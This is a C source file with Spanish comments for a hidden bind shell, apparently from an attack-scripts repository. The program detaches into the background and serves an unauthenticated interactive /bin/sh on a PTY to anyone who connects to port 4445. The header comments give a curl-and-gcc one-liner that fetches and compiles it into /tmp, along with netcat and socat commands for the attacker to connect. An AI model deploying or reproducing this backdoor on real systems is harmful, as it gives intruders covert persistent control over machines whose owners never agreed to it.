//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/TerminalReversa/Shell.c > /tmp/ReverseShell.c; gcc /tmp/ReverseShell.c -o /tmp/ReverseShell
//
// Conectarse desde la máquina atacante:
//
//  Con netcat (no es una terminal completa porque no se puede navegar por midnight commander):
//    nc 192.168.1.100 4445
//  Con socat:
//    socat file:`tty`,raw,echo=0 TCP:192.168.1.100:4445

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pty.h>
#include <utmp.h>
#include <string.h>

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("[-] Error en fork() inicial");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        // Cerrar el proceso padre
        exit(0);
    }

    // Crear nueva sesión para que el proceso se desacople del terminal actual
    if (setsid() < 0) {
        perror("[-] Error en setsid()");
        exit(EXIT_FAILURE);
    }
    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) {
        perror("[-] Error en segundo fork()");
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        // Cerrar el segundo padre
        exit(0);
    }

    // Redirigir I/O a /dev/null para que corra en segundo plano
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        close(fd);
    }

    chdir("/");
    umask(0);
}

int main() {
    // Llamamos a daemonize() para que quede en segundo plano
    daemonize();

    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    int master_fd, slave_fd;
    pid_t pid;

    // Aquí definimos el intérprete de comandos: /bin/sh -i
    // Y definimos unas variables de entorno mínimas (TERM, PATH)
    char *sh_shell[] = {"/bin/sh", "-i", NULL};
    char *envp[] = {
        "TERM=xterm",
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        NULL
    };

    // Crear el socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(EXIT_FAILURE);

    // Configurar la dirección y puerto (4444)
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4445);

    // Enlazar el socket al puerto
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Escuchar conexiones entrantes
    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Bucle infinito para aceptar múltiples conexiones
    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) {
            // Si falla accept(), volvemos arriba
            continue;
        }

        // Crear un par de PTYs (master, slave)
        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) {
            close(clientfd);
            continue;
        }

        pid = fork();
        if (pid == 0) {
            // Este proceso hijo ejecutará /bin/sh con el slave_fd como terminal

            // Cerramos descriptores que no usamos
            close(sockfd);
            close(master_fd);

            // login_tty() asocia slave_fd al proceso como su tty principal
            login_tty(slave_fd);

            // Ejecutar /bin/sh con el entorno definido
            execve("/bin/sh", sh_shell, envp);
            // Si execve falla:
            exit(EXIT_FAILURE);
        }

        // En el padre cerramos el slave, porque lo usará el hijo
        close(slave_fd);

        // Redirigimos los datos (bidireccional) entre clientfd (atacante) y master_fd (shell)
        char buffer[1024];
        ssize_t n;
        fd_set fds;

        while (1) {
            FD_ZERO(&fds);
            FD_SET(clientfd, &fds);
            FD_SET(master_fd, &fds);

            int max_fd = (clientfd > master_fd) ? clientfd : master_fd;
            max_fd++;

            int activity = select(max_fd, &fds, NULL, NULL, NULL);
            if (activity < 0) {
                break; // Si hay un error en select(), salimos del bucle
            }

            // Datos desde la red hacia el shell
            if (FD_ISSET(clientfd, &fds)) {
                n = read(clientfd, buffer, sizeof(buffer));
                if (n <= 0) {
                    break; // Se cerró la conexión o error
                }
                write(master_fd, buffer, n);
            }

            // Datos desde el shell hacia la red
            if (FD_ISSET(master_fd, &fds)) {
                n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) {
                    break; // Shell cerrado o error
                }
                write(clientfd, buffer, n);
            }
        }

        close(master_fd);
        close(clientfd);
    }

    close(sockfd);
    return 0;
}
